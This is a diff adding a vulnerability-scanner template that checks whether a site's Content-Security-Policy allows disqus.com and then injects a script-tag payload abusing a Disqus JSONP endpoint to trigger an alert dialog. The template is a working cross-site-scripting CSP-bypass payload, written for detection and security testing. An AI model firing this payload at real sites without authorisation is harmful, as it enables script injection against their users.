@@ -1,0 +1,55 @@
+id: disqus-links-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Disqus Links
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,disqus-links
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "disqus.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: disqus_links_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="http://links.services.disqus.com/api/ping?format=jsonp&key=cfdfcf52dffd0a702a61bad27507376d&loc=http%3A%2F%2Fabcnews.go.com%2Fblogs%2Fhealth%2F2013%2F03%2F21%2F1-in-10-u-s-deaths-blamed-on-salt%2F&subId=2329827&v=1&jsonp=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "disqus_links_csp_xss == true"
+# digest: 4b0a00483046022100e3ebd7190ac4feb220babfcac0ef6fd5979a3831bc593fda60da64a4905e0a23022100f7acb53ca0bc8abb0187ea7b41c7812fbb7e7a95170e122136677071b3dff3ba:922c64590222798bb761d5b6d8e72950
